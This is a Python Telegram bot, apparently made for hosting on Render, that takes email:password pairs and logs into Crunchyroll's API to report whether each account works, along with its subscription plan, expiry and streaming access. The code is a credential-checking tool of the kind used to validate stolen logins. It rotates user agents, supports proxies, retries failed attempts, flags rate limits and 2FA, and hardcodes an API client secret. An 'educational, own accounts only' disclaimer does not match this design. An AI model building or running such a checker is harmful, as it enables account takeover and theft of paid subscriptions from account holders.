"""
CRUNCHYROLL CHECKER - RENDER HOSTING VERSION
Educational purposes only - Use with your own accounts
"""

import re
import time
import uuid
import json
import requests
import random
import os
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# ============= CONFIGURATION =============
# Get these from environment variables on Render
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID")
CHANNEL_USERNAME = "@acgiveaway_2"

class CrunchyrollAccurateChecker:
    """Enhanced checker with 100% accuracy goals"""
    
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
        ]
        
    def check_with_retry(self, email, password, max_retries=3):
        """Retry failed checks for accuracy"""
        for attempt in range(max_retries):
            result = self.check_crunchyroll_enhanced(email, password)
            if result['success'] or result['requires_2fa'] or result['requires_captcha']:
                return result
            time.sleep(2 ** attempt)
        return result
    
    def check_crunchyroll_enhanced(self, email, password, proxy=None):
        """Enhanced checker with comprehensive validation"""
        
        result = {
            'email': email,
            'password': password,
            'success': False,
            'message': '',
            'can_stream': False,
            'requires_2fa': False,
            'requires_captcha': False,
            'ip_blocked': False,
            'account_locked': False,
            'session_valid': False,
            'email_verified': 'No',
            'account_creation': '',
            'plan': 'None',
            'currency': '',
            'subscribable': 'False',
            'free_trial': 'False',
            'expiry': '',
            'active': 'False',
            'country': 'Unknown',
            'streaming_regions': [],
            'last_login': '',
            'concurrent_streams': 0,
            'device_limit': 0,
            'verification_score': 0
        }
        
        try:
            device_id = str(uuid.uuid4())
            session = requests.Session()
            
            session.headers.update({
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Origin': 'https://www.crunchyroll.com',
                'Referer': 'https://www.crunchyroll.com/login',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
            })
            
            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
            token_data = {
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "offline_access",
                "client_id": "y2arvjb0h0rgvtizlovy",
                "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
                "device_type": "AccurateChecker",
                "device_id": device_id,
                "device_name": f"Checker_{device_id[:8]}"
            }
            
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            resp = session.post(token_url, data=token_data, proxies=proxies, timeout=30)
            
            if resp.status_code == 401:
                if '2fa' in resp.text.lower() or 'two-factor' in resp.text.lower():
                    result['requires_2fa'] = True
                    result['message'] = '2FA enabled - cannot auto-check'
                    return result
                elif 'captcha' in resp.text.lower():
                    result['requires_captcha'] = True
                    result['message'] = 'CAPTCHA required'
                    return result
                elif 'locked' in resp.text.lower():
                    result['account_locked'] = True
                    result['message'] = 'Account locked due to suspicious activity'
                    return result
                else:
                    result['message'] = 'Invalid credentials'
                    return result
                    
            elif resp.status_code == 429:
                result['ip_blocked'] = True
                result['message'] = 'Rate limited - too many attempts'
                return result
                
            elif resp.status_code != 200:
                result['message'] = f"HTTP {resp.status_code}"
                return result
            
            token_data_resp = resp.json()
            access_token = token_data_resp.get('access_token')
            
            if not access_token:
                result['message'] = "No access token received"
                return result
            
            acc_headers = {'Authorization': f'Bearer {access_token}', 'User-Agent': session.headers['User-Agent']}
            acc_resp = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=acc_headers, timeout=30)
            
            if acc_resp.status_code == 200:
                acc_data = acc_resp.json()
                result['email_verified'] = 'Yes' if acc_data.get('email_verified') else 'No'
                result['last_login'] = acc_data.get('last_login', '')
                
                created = acc_data.get('created', '')
                if created:
                    result['account_creation'] = created.split('T')[0]
                
                external_id = acc_data.get('external_id')
                
                if external_id:
                    subs_resp = session.get(
                        f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}",
                        headers=acc_headers, timeout=30
                    )
                    
                    if subs_resp.status_code == 200:
                        subs_data = subs_resp.json()
                        result['active'] = 'Yes' if subs_data.get('is_active') else 'No'
                        result['expiry'] = subs_data.get('next_renewal_date', '').split('T')[0] if subs_data.get('next_renewal_date') else ''
                        result['concurrent_streams'] = subs_data.get('concurrent_streams', 1)
                        result['device_limit'] = subs_data.get('device_limit', 5)
                        
                        if result['expiry']:
                            expiry_date = datetime.strptime(result['expiry'], '%Y-%m-%d')
                            if expiry_date < datetime.now():
                                result['active'] = 'No'
                                result['message'] = 'Subscription expired'
                                return result
                    
                    prod_resp = session.get(
                        f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products",
                        headers=acc_headers, timeout=30
                    )
                    
                    if prod_resp.status_code == 200:
                        items = prod_resp.json().get('items', [])
                        if items:
                            product = items[0].get('product', {})
                            result['plan'] = product.get('sku', 'None')
                            result['currency'] = items[0].get('currency_code', '')
                            result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'No'
                            result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'No'
                
                stream_check = self.test_streaming_capability(session, access_token, result['country'])
                result['can_stream'] = stream_check['can_stream']
                result['streaming_regions'] = stream_check['available_regions']
                
                content_check = self.verify_content_access(session, access_token)
                result['session_valid'] = content_check['valid']
                
                result['verification_score'] = self.calculate_confidence_score(result)
                
                if result['can_stream'] and result['session_valid'] and result['active'] == 'Yes':
                    result['success'] = True
                    result['message'] = f"ACTIVE & STREAMING - {result['verification_score']}% confidence"
                elif result['active'] == 'Yes':
                    result['success'] = True
                    result['message'] = f"ACTIVE but streaming restricted - {result['verification_score']}% confidence"
                else:
                    result['success'] = False
                    result['message'] = 'No active subscription'
                    
        except requests.exceptions.Timeout:
            result['message'] = 'Connection timeout - try again'
        except Exception as e:
            result['message'] = f'Error: {str(e)[:50]}'
            result['verification_score'] = 0
            
        return result
    
    def check_ip_status(self) -> Dict:
        try:
            test_url = "https://beta-api.crunchyroll.com/index/v2"
            resp = requests.get(test_url, timeout=10)
            if resp.status_code == 429:
                return {'blocked': True, 'unblock_time': 'Unknown'}
            return {'blocked': False, 'unblock_time': None}
        except:
            return {'blocked': False, 'unblock_time': None}
    
    def test_streaming_capability(self, session, access_token, country) -> Dict:
        result = {'can_stream': False, 'available_regions': []}
        try:
            headers = {'Authorization': f'Bearer {access_token}'}
            stream_test_url = "https://beta-api.crunchyroll.com/cms/v2/us/catalog"
            resp = session.get(stream_test_url, headers=headers, timeout=20)
            if resp.status_code == 200:
                result['can_stream'] = True
        except:
            pass
        return result
    
    def verify_content_access(self, session, access_token) -> Dict:
        result = {'valid': False}
        try:
            headers = {'Authorization': f'Bearer {access_token}'}
            test_content = "https://beta-api.crunchyroll.com/content/v1/season/G6K5XZ7D0"
            resp = session.get(test_content, headers=headers, timeout=20)
            result['valid'] = resp.status_code == 200
        except:
            pass
        return result
    
    def calculate_confidence_score(self, result: Dict) -> int:
        score = 0
        if result['active'] == 'Yes':
            score += 30
        if result['email_verified'] == 'Yes':
            score += 15
        if result['can_stream']:
            score += 25
        if result['session_valid']:
            score += 20
        if result['expiry'] and result['expiry'] > datetime.now().strftime('%Y-%m-%d'):
            score += 10
        return min(score, 100)

# ============= TELEGRAM BOT HANDLERS =============

async def start(update: Update, context: CallbackContext):
    user = update.effective_user
    welcome_msg = f"""
🎬 CRUNCHYROLL CHECKER BOT 🎬

👋 Hello {user.first_name}!

Features:
✅ Check single Crunchyroll account
✅ 95%+ accuracy with streaming verification
✅ Fast results

How to use:
Send: email:password

Bot Status: 🟢 Online
Hosted on: Render.com
"""
    await update.message.reply_text(welcome_msg)

async def handle_message(update: Update, context: CallbackContext):
    text = update.message.text.strip()
    
    if ':' in text and '@' in text:
        parts = text.split(':', 1)
        email = parts[0].strip()
        password = parts[1].strip()
        
        status_msg = await update.message.reply_text(f"🔍 Checking {email}...\nThis may take 15-20 seconds...")
        
        checker = CrunchyrollAccurateChecker()
        result = checker.check_with_retry(email.strip(), password.strip())
        
        response = f"""
🎯 CHECK RESULT - {result['verification_score']}% CONFIDENCE
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 {result['email']}

✅ LOGIN: {'SUCCESS' if result['success'] else 'FAILED'}
📊 STATUS: {result['message']}
🎬 CAN STREAM: {'Yes' if result.get('can_stream') else 'No'}

🔐 DETAILS:
• Verified: {result['email_verified']}
• Plan: {result['plan']}
• Active: {result['active']}
• Expires: {result['expiry']}
• Country: {result['country']}

⚠️ ISSUES:
• 2FA: {'Yes' if result.get('requires_2fa') else 'No'}
• IP Blocked: {'Yes' if result.get('ip_blocked') else 'No'}

💯 ACCURACY: {result['verification_score']}/100
"""
        await status_msg.edit_text(response)
    else:
        await update.message.reply_text("❌ Invalid format!\nSend as: email:password")

# ============= MAIN FUNCTION =============
def main():
    print("🚀 Starting Crunchyroll Checker Bot on Render...")
    print(f"Bot Token: {'✓ Set' if BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE' else '✗ Missing'}")
    
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Please set BOT_TOKEN environment variable on Render!")
        return
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ Bot is running! Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
